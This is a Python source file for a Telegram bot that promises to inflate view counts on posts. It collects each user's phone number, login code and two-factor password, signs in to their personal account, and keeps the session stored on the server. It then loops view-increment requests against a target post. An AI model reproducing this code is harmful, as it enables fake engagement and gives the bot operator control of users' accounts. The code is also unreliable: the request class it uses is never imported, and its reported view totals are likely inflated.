import os
import asyncio
import logging
import re
from typing import Dict, Optional

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, ConversationHandler, MessageHandler,
    filters, ContextTypes
)

# ------------------ CONFIGURATION ------------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

# You must create your own API ID and Hash at my.telegram.org
# These are NOT secret; they identify your app, not your user account.
API_ID = int(os.getenv("API_ID", "YOUR_API_ID"))        # Replace or set env
API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")      # Replace or set env

# Conversation states
WAITING_FOR_TARGET = 0
WAITING_FOR_VIEWS = 1
WAITING_FOR_PHONE = 2
WAITING_FOR_OTP = 3
WAITING_FOR_2FA = 4

# In-memory storage for user sessions (volatile, lost on restart)
# Key: user_id, Value: Telethon client instance
user_clients: Dict[int, TelegramClient] = {}
user_temp_data: Dict[int, dict] = {}   # stores phone, target channel, msg_id, views

logging.basicConfig(level=logging.INFO)

# ------------------ HELPER: Send views using logged-in client ------------------
async def send_views(client: TelegramClient, channel: str, message_id: int, views: int) -> int:
    """Send views using the authenticated user client."""
    success = 0
    for i in range(views):
        try:
            result = await client(GetMessagesViewsRequest(
                peer=channel,
                id=[message_id],
                increment=True
            ))
            if result.views and len(result.views) > 0:
                success += 1
            await asyncio.sleep(1.5)  # small delay to avoid flood
        except FloodWaitError as e:
            logging.warning(f"Flood wait {e.seconds}s")
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logging.error(f"View error: {e}")
    return success

# ------------------ CONVERSATION HANDLERS ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *Ultimate View Bot* 🔥\n\n"
        "Send me a Telegram post URL like:\n"
        "`https://t.me/durov/123`\n\n"
        "Then I'll ask how many views you want.\n"
        "After that, you will log in with your **Telegram user account** (not a bot).",
        parse_mode="Markdown"
    )
    return WAITING_FOR_TARGET

async def receive_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    match = re.search(r"t\.me/([^/]+)/(\d+)", url)
    if not match:
        await update.message.reply_text("❌ Invalid URL. Use format: `https://t.me/username/post_id`")
        return WAITING_FOR_TARGET

    channel = match.group(1)
    post_id = int(match.group(2))
    context.user_data['channel'] = channel
    context.user_data['post_id'] = post_id

    await update.message.reply_text(
        f"✅ Target: `{channel}/{post_id}`\n\n"
        "Now send the *number of views* you want (e.g., 1000).",
        parse_mode="Markdown"
    )
    return WAITING_FOR_VIEWS

async def receive_views(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        views = int(update.message.text.strip())
        if views <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Please send a positive integer.")
        return WAITING_FOR_VIEWS

    context.user_data['views'] = views
    user_id = update.effective_user.id

    # Check if we already have a logged-in client for this user
    if user_id in user_clients:
        client = user_clients[user_id]
        try:
            # Test if client is still alive
            await client.get_me()
            # Send views immediately
            await update.message.reply_text("✅ Already logged in. Sending views...")
            sent = await send_views(
                client,
                context.user_data['channel'],
                context.user_data['post_id'],
                views
            )
            await update.message.reply_text(
                f"✅ *Complete!*\nSent {sent} out of {views} views to "
                f"`{context.user_data['channel']}/{context.user_data['post_id']}`.",
                parse_mode="Markdown"
            )
            return ConversationHandler.END
        except Exception:
            # Client expired or disconnected, remove and re-login
            del user_clients[user_id]

    # No active session – ask for login
    user_temp_data[user_id] = {
        'channel': context.user_data['channel'],
        'post_id': context.user_data['post_id'],
        'views': views
    }
    await update.message.reply_text(
        "🔐 *Login required*\n\n"
        "Please send your **phone number** in international format (e.g., `+1234567890`).",
        parse_mode="Markdown"
    )
    return WAITING_FOR_PHONE

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("❌ Phone number must start with `+` and country code.")
        return WAITING_FOR_PHONE

    user_id = update.effective_user.id
    user_temp_data[user_id]['phone'] = phone

    # Create a new Telethon client for this user
    session_name = f"user_{user_id}"
    client = TelegramClient(session_name, API_ID, API_HASH)
    user_clients[user_id] = client

    await update.message.reply_text("📲 Sending verification code...")

    try:
        await client.connect()
        if not await client.is_user_authorized():
            # Request the code
            await client.send_code_request(phone)
            await update.message.reply_text(
                "📨 A verification code has been sent to your Telegram app.\n"
                "Please send the code here (e.g., `12345`)."
            )
            return WAITING_FOR_OTP
        else:
            # Already authorized (should not happen with new session)
            await update.message.reply_text("✅ Already logged in. Sending views...")
            return await finalize_login_and_send(update, context, user_id)
    except Exception as e:
        logging.error(f"Phone error: {e}")
        await update.message.reply_text(f"❌ Error: {e}\nPlease try again with /start")
        return ConversationHandler.END

async def receive_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    user_id = update.effective_user.id
    client = user_clients.get(user_id)
    if not client:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    phone = user_temp_data[user_id]['phone']
    try:
        await client.sign_in(phone, code)
        # Check if 2FA is required
        if await client.is_user_authorized():
            return await finalize_login_and_send(update, context, user_id)
        else:
            # 2FA required
            await update.message.reply_text("🔐 Two‑factor authentication is enabled. Please send your password.")
            return WAITING_FOR_2FA
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid code. Please try again.")
        return WAITING_FOR_OTP
    except SessionPasswordNeededError:
        await update.message.reply_text("🔐 Two‑factor authentication is enabled. Please send your password.")
        return WAITING_FOR_2FA
    except Exception as e:
        logging.error(f"OTP error: {e}")
        await update.message.reply_text(f"❌ Error: {e}\nPlease /start again.")
        return ConversationHandler.END

async def receive_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    user_id = update.effective_user.id
    client = user_clients.get(user_id)
    if not client:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    try:
        await client.sign_in(password=password)
        return await finalize_login_and_send(update, context, user_id)
    except Exception as e:
        await update.message.reply_text(f"❌ Incorrect password or error: {e}\nPlease try again.")
        return WAITING_FOR_2FA

async def finalize_login_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    client = user_clients[user_id]
    data = user_temp_data.get(user_id, {})
    channel = data.get('channel')
    post_id = data.get('post_id')
    views = data.get('views')

    if not channel or not post_id or not views:
        await update.message.reply_text("❌ Target information missing. Please /start again.")
        return ConversationHandler.END

    await update.message.reply_text(f"✅ Logged in as {(await client.get_me()).first_name}. Sending {views} views...")
    sent = await send_views(client, channel, post_id, views)
    await update.message.reply_text(
        f"✅ *Complete!*\nSent {sent} out of {views} views to "
        f"`{channel}/{post_id}`.\n\n"
        f"Use /start to send more views (you stay logged in).",
        parse_mode="Markdown"
    )
    # Clean temporary data but keep client for future requests
    user_temp_data.pop(user_id, None)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_clients:
        await user_clients[user_id].disconnect()
        del user_clients[user_id]
    user_temp_data.pop(user_id, None)
    await update.message.reply_text("Cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ------------------ MAIN ------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_target)],
            WAITING_FOR_VIEWS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_views)],
            WAITING_FOR_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            WAITING_FOR_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp)],
            WAITING_FOR_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_2fa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()
